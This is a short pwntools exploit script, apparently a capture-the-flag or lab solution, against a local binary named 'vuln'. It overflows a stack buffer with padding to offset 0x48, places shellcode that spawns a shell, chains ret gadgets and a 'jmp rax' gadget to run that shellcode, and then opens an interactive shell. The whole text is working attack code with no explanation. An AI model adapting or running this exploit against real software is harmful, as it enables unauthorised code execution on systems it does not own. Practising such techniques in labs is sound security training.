from pwn import *

context.binary = ELF('./vuln')
p = process()

jmprax = 0x40112c
ret = 0x40101a

shellcode = asm(shellcraft.sh())
padd = b'A'*(0x48-len(shellcode))
pay = flat(
    shellcode,
    padd,
    ret, ret,
    jmprax
)

p.sendline(pay)
p.interactive()
